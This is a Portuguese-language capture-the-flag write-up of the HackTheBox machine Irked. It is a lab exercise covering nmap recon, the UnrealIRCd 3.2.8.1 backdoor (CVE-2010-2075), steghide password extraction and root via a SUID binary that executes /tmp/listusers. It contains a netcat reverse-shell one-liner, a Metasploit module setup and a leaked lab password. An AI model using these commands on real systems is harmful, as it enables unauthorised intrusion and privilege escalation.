Irked

HackTheBox · Easy by Brenno M.

Irked roda um UnrealIRCd 3.2.8.1 com o backdoor inserido no pacote oficial em 2009 (CVE-2010-2075). Uma senha escondida por esteganografia leva ao usuário djmardov, e um binário SUID que executa um arquivo de /tmp fecha o root.

Reconhecimento

Além de SSH, Apache e rpcbind, o UnrealIRCd escuta em 6697, 8067 e 65534. A página web só mostra uma imagem e o aviso "IRC is almost working!".

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
# 22, 80, 111, 6697, 8067, 46492, 65534
nmap -Pn -n -sT -sV -sC -p22,80,111,6697,8067,65534 <IP>
# 22 OpenSSH 6.7p1, 80 Apache 2.4.10, 6697/8067/65534 UnrealIRCd

Exploração - CVE-2010-2075

O tarball do UnrealIRCd 3.2.8.1 distribuído entre 2009 e 2010 foi trocado por uma versão que executa qualquer mensagem iniciada por AB;. Uma linha basta para a shell como ircd.

nc -lvnp 4444
echo "AB; nc -e /bin/bash <MEU_IP> 4444" | nc <IP> 8067
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <IP>
set RPORT 65534
set payload cmd/unix/reverse
set LHOST tun0
run

Movimentação lateral - esteganografia

Em /home/djmardov/Documents, o .backup diz "steg backup pw" e traz uma senha. A única imagem à vista é a irked.jpg do site, e o steghide extrai dela a senha SSH do djmardov.

cat /home/djmardov/Documents/.backup
# Super elite steg backup pw
# UPupDOWNdownLRlrBAbaSSss
wget http://<IP>/irked.jpg
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
cat pass.txt
ssh djmardov@<IP>
cat ~/user.txt

Escalação - SUID viewuser

O /usr/bin/viewuser é SUID root e não é um binário padrão. Ao rodar, ele reclama que /tmp/listusers não existe: o programa faz setuid(0) e executa esse arquivo. Basta criá-lo.

find / -type f -perm -4000 2>/dev/null
/usr/bin/viewuser
# sh: 1: /tmp/listusers: not found
printf '/bin/sh' > /tmp/listusers
chmod +x /tmp/listusers
/usr/bin/viewuser
id   # uid=0(root)
cat /root/root.txt
